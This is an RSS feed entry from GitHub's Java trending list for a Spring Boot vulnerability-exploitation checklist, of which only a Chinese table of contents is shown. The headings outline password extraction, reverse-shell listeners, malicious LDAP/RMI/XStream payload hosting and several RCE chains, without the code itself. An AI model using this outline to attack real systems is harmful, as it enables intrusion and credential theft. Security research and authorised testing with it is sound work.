<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Java Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-09-29T01:34:56Z</updated>
  <subtitle>Daily Trending of Java in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>LandGrey/SpringBootVulExploit</title>
    <updated>2022-09-29T01:34:56Z</updated>
    <id>tag:github.com,2022-09-29:/LandGrey/SpringBootVulExploit</id>
    <link href="https://github.com/LandGrey/SpringBootVulExploit" rel="alternate"></link>
    <summary type="html">&lt;p&gt;SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Spring Boot Vulnerability Exploit Check List&lt;/h1&gt; &#xA;&lt;p&gt;Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list&lt;/p&gt; &#xA;&lt;h2&gt;声明&lt;/h2&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;⚠️ 本项目所有内容仅作为安全研究和授权测试使用, 相关人员对因误用和滥用该项目造成的一切损害概不负责&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;目录&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#spring-boot-vulnerability-exploit-check-list&#34;&gt;Spring Boot Vulnerability Exploit Check List&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E9%9B%B6%E8%B7%AF%E7%94%B1%E5%92%8C%E7%89%88%E6%9C%AC&#34;&gt;零：路由和版本&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x01%E8%B7%AF%E7%94%B1%E7%9F%A5%E8%AF%86&#34;&gt;0x01：路由知识&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x02%E7%89%88%E6%9C%AC%E7%9F%A5%E8%AF%86&#34;&gt;0x02：版本知识&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E7%BB%84%E4%BB%B6%E7%89%88%E6%9C%AC%E7%9A%84%E7%9B%B8%E4%BA%92%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB&#34;&gt;组件版本的相互依赖关系：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#spring-cloud-%E4%B8%8E-spring-boot-%E7%89%88%E6%9C%AC%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB&#34;&gt;Spring Cloud 与 Spring Boot 版本之间的依赖关系：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#spring-cloud-%E5%B0%8F%E7%89%88%E6%9C%AC%E5%8F%B7%E7%9A%84%E5%90%8E%E7%BC%80%E5%8F%8A%E5%90%AB%E4%B9%89&#34;&gt;Spring Cloud 小版本号的后缀及含义:&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2&#34;&gt;一：信息泄露&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F&#34;&gt;0x01：路由地址及接口调用详情泄漏&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x02%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1&#34;&gt;0x02：配置不当而暴露的路由&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80&#34;&gt;0x03：获取被星号脱敏的密码的明文 (方法一)&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D&#34;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C-jolokia-%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3-mbean-%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87&#34;&gt;步骤二： jolokia 调用相关 Mbean 获取明文&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x04%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%BA%8C&#34;&gt;0x04：获取被星号脱敏的密码的明文 (方法二)&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-1&#34;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82&#34;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7&#34;&gt;步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE&#34;&gt;步骤四： 刷新配置&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%94-%E8%A7%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%80%BC&#34;&gt;步骤五： 解码属性值&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x05%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%89&#34;&gt;0x05：获取被星号脱敏的密码的明文 (方法三)&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-2&#34;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82-1&#34;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%A7%A6%E5%8F%91%E5%AF%B9%E5%A4%96-http-%E8%AF%B7%E6%B1%82&#34;&gt;步骤三： 触发对外 http 请求&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1&#34;&gt;步骤四： 刷新配置&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x06%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E5%9B%9B&#34;&gt;0x06：获取被星号脱敏的密码的明文 (方法四)&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-3&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-3&#34;&gt;步骤一： 找到想要获取的属性名&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%B8%8B%E8%BD%BD-jvm-heap-%E4%BF%A1%E6%81%AF&#34;&gt;步骤二： 下载 jvm heap 信息&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E4%BD%BF%E7%94%A8-mat-%E8%8E%B7%E5%BE%97-jvm-heap-%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87&#34;&gt;步骤三： 使用 MAT 获得 jvm heap 中的密码明文&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E4%BA%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&#34;&gt;二：远程代码执行&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x01whitelabel-error-page-spel-rce&#34;&gt;0x01：whitelabel error page SpEL RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-4&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E4%BC%A0%E5%8F%82%E5%A4%84&#34;&gt;步骤一：找到一个正常传参处&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%A7%E8%A1%8C-spel-%E8%A1%A8%E8%BE%BE%E5%BC%8F&#34;&gt;步骤二：执行 SpEL 表达式&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&#34;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x02spring-cloud-snakeyaml-rce&#34;&gt;0x02：spring cloud SnakeYAML RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-5&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%98%E7%AE%A1-yml-%E5%92%8C-jar-%E6%96%87%E4%BB%B6&#34;&gt;步骤一： 托管 yml 和 jar 文件&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E8%AE%BE%E7%BD%AE-springcloudbootstraplocation-%E5%B1%9E%E6%80%A7&#34;&gt;步骤二： 设置 spring.cloud.bootstrap.location 属性&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE&#34;&gt;步骤三： 刷新配置&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1&#34;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x03eureka-xstream-deserialization-rce&#34;&gt;0x03：eureka xstream deserialization RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-6&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-6&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9E%B6%E8%AE%BE%E5%93%8D%E5%BA%94%E6%81%B6%E6%84%8F-xstream-payload-%E7%9A%84%E7%BD%91%E7%AB%99&#34;&gt;步骤一：架设响应恶意 XStream payload 的网站&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3&#34;&gt;步骤二：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7&#34;&gt;步骤三：设置 eureka.client.serviceUrl.defaultZone 属性&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE&#34;&gt;步骤四：刷新配置&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2&#34;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x04jolokia-logback-jndi-rce&#34;&gt;0x04：jolokia logback JNDI RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-7&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-7&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans&#34;&gt;步骤一：查看已存在的 MBeans&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6&#34;&gt;步骤二：托管 xml 文件&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81&#34;&gt;步骤三：准备要执行的 Java 代码&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1&#34;&gt;步骤四：架设恶意 ldap 服务&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3&#34;&gt;步骤五：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%85%AD%E4%BB%8E%E5%A4%96%E9%83%A8-url-%E5%9C%B0%E5%9D%80%E5%8A%A0%E8%BD%BD%E6%97%A5%E5%BF%97%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&#34;&gt;步骤六：从外部 URL 地址加载日志配置文件&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3&#34;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3&#34;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-3&#34;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#0x05jolokia-realm-jndi-rce&#34;&gt;0x05：jolokia Realm JNDI RCE&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-8&#34;&gt;利用条件：&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-8&#34;&gt;利用方法：&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans-1&#34;&gt;步骤一：查看已存在的 MBeans&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81&#34;&gt;步骤二：准备要执行的 Java 代码&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6&#34;&gt;步骤三：托管 class 文件&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rmi-%E6%9C%8D%E5%8A%A1&#34;&gt;步骤四：架设恶意 